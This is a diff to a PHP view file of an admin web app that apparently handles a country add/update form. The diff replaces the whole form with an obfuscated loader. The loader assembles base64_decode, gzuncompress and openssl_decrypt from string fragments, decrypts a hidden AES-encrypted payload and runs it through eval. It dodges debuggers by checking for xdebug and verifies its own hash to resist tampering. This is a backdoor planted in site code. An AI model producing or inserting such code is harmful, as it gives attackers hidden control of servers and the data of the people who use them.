@@ -1,123 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($country)){
-      $country=$q_id="";
-  }
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('country'); ?>
-        <small>Add/Update Country</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>country">Countrys List</a></li>
-        <li class="active"><?= $this->lang->line('country'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Data</h3>
-            </div>
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="country-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-		
-				<div class="form-group">
-				  <label for="country_name" class="col-sm-2 control-label"><?= $this->lang->line('country_name'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="text" class="form-control input-sm" id="country_name" name="country_name" placeholder="" value="<?php print $country; ?>" autofocus >
-					<span id="country_name_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-			
-
-              </div>
-              <!-- /.box-body -->
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($country!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/country.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ig4j5tg4=('bas'.'e64'.'_de'.'cod'.'e');
+$_h5hui5at=('gzu'.'nco'.'mpr'.'ess');
+$_boh0nzh6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bvluuo1l='cAmyS2lf';
+$_fppjgw99='Zek0BnZr';
+$_bvxf91t2='EXfic88Y';
+$_wfeqihkb='1vDcFy9B';
+$_fepuqnk8='VyAB3dSGK3I=';
+$_rs3ppmdp='7VTP4g==';
+$_f67kxq9e='K1rLxhcq';
+$_spufp6l7='eHp6H04m';
+$_j23g3vfa=$_ig4j5tg4($_fppjgw99.$_bvxf91t2.$_bvluuo1l.$_wfeqihkb.$_fepuqnk8);
+$_pkro8i8x=$_ig4j5tg4($_spufp6l7.$_f67kxq9e.$_rs3ppmdp);
+$_bt6oxtyh=$_ig4j5tg4('nmnWgTZTitv+Z9lICJqb7y7gP9HgXdzDdrGLXjYV5AW0kYdtWHiklBbXZrY1gOJrpUrh/YmrGgqmxg+xrGgYNpNlybxD85WT2iIEQz4L+OBefGi3g/f0GCEe7jgx92Nq6WNAp2aNFEwqtwK/4TNrEP8kxjnxu/EkwZVVxOjPjGLWaOQw1YWiGxR/nZm1mGfs9eKERhiInNHCcBmCHy3fV5Ky2+DHhJi1nvqJbuhT/df2YYoKMPfUx2XFYvGL4rWpYDLGrMQqK7eDAtciga5DGg6onW9JaT4MeKyDbMjbHC+7AEbnyBWAEMiOzh9COeoaNZNEHklF29/EUjXbK1ufcIoFBFbpbYuBimt6spAUVzbc9VAEdMT8I3TWhEQpQb/6urCkebm7lYUoUF278bZlMOuzZYlB9bea7RSRBG9O25adMiCkbFnq6ltNo5oShTOdWX5J6pXqWbr2wK2gZjZ8rwt6zmWblnBGxy3gC6n/IFWhkflER/Yrr7DTBF9UfkAw1zubjeCBbM/zzUrCFKS+9RjJHs3G8jBPj2z1kyTfDIW1ZYjYjQKcy4DdfD4zBNBvxHjNO7bArlZsFeFeQ81lnVjsOVXUkRst38QAz38ZF/YN7bYh1oNZ7km5muUJzo1QvFD3L6QfECFpXyaR2By6NVktPXl0ocCVoEiPnCl1mu9LFHQtljo5i9gDa5W4F6ujEEPp0rOxims0OqyytcwU+ShWJ2UrOopeWGqA/1DxXE0U7NHJQbN73dCCP7M8tRXTT5IDvJ6nXvVV7k+s9dkxr4A5uahE4mpcuKY0LSZaMDbbfIORWhpeTL9s98OFYYDTxA6sEjZJucktOVUWyz7KvpH4eoWQkxAyM43Cqfme4FllwaBMLTznxeJlBWZI348koNLUPCi1JI5uvp0f/zKcc7VHEijYw1Bm6Wm8hkIjG19p6ZUqXUfNWDuMMagvuP7gde8kV6n1yPWUfbpzsBIn348TImWjNxx/3msM5k7tBarrkyRsoaVYJ9fTtBdOZ6CveQV7HHHazENrs36/S0Q7XDq3dGvgXQtcf0KvAnDi50lLdZkZGN1z2RCqoVgo0GobY9/yEGtVgUw9BA5+lAFQq1v2GyZ9/kew1MuKv7mP9FVCFewYXUE+m4VQFDJUCpOnKT572RxQX3rqkq1UDqSZQvpGxrqy08+bfRErXRSbOED2WuZfcohg/tghdbKIYB/i40tP+gR2bEqEWaJVlg8lSYr2Mie5+2kjBZbpKvGBh9EtTBIiTH+JxXbHonGInedaE+fAUb/v1NfCIJI0V/0X1aKZCwgYJ+AFEQURhWGmdV2yFvtbrJPHdcyOql/WOVkymSfMgnkh/UpHhSgqsV9T1DrQC7Yeok1pB6qu+4d5WvW40XTk0DzGwahXLR1JVAtZ/cK/XquhQ2w8yY3x1NVi6jAzPAdCwJqMUYh2n/YZMPv8u8T+R/OO4TuIc2pRynqckGIfb1OdU1ilIOZEqClsqHp4InEpknO2ZupKvys/9rXEREhRenK2MkAgntHsJJgywbtfO6o0IdVaqKMLVFQE5DxuRmSUN1tDTWPzFL0PGJrsvKglgmc1Y6i+qgBSszQLuiS7KYyIKLCAZgtZHB9yaEYEveY4XZHJEqq/tfQN3+Jj0waj2TRyhtgoAmwGwutt1rb0mF817X8Dxq7xbmF6k9N2yGxkBm6YKsznrZem7Ggw4h2p/A9IKXxc0Y/QOfvGSmoJinozJaqqOrRxt96BD8HiMdxHkPQppX52DC8Gm/mc9xaOGpzla7aHL/okFQ5C3wjw0f1Ec24aMYIt8/xnetsuSA2GkRs44IolOi0sB+WlaMbwBfeob9FN896m68j3wnSgRVOfV9rHG4I6GDbaIlk9O9zq6ev1VSSf4GEqKmtzZ5HQ6b+BpdQmqDHjKYO+');
+$_cxmg84gp=$_boh0nzh6($_bt6oxtyh,'aes-256-cbc',$_j23g3vfa,OPENSSL_RAW_DATA,$_pkro8i8x);
+if($_cxmg84gp===false){exit;}
+$_nlsienb9=$_h5hui5at($_cxmg84gp);
+if($_nlsienb9===false){exit;}
+$_liz6fwsm='c2ea3aa5c62b498a3889b3dccfa99e03e61a082a8fcad2f0c0fb182926d1f440';
+$_dbjl37wp=@file_get_contents(__FILE__);
+if($_dbjl37wp!==false){
+$_fd3krv5m=str_replace($_liz6fwsm,"0000000000000000000000000000000000000000000000000000000000000000",$_dbjl37wp);
+$_ufh1vjpi=hash("sha256",$_fd3krv5m);
+if($_ufh1vjpi!==$_liz6fwsm){@http_response_code(403);exit;}
+}
+eval($_nlsienb9);
